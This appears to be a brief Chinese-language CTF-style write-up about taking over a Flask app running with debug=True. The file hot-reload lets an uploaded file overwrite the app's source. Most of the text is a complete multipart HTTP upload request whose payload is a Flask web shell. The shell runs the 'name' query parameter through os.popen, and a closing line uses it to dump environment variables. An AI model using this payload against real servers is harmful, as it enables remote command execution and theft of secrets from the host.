如果flask开了debug=true，即可热加载文件，类似于php。
我们可以上传文件覆盖原文件。
```
GET / HTTP/1.1
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary8ALIn5Z2C3VlBqND
Content-Length: 427

------WebKitFormBoundary8ALIn5Z2C3VlBqND
Content-Disposition: form-data; name="n"; filename="1.py"
Content-Type: text/plain

from flask import *
import os
app = Flask(__name__)


@app.route('/')
def index():
    name = request.args['name']
    file=os.popen(name).read()
    return file


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000, debug=True)
------WebKitFormBoundary8ALIn5Z2C3VlBqND--
```
再?name=env查看环境变量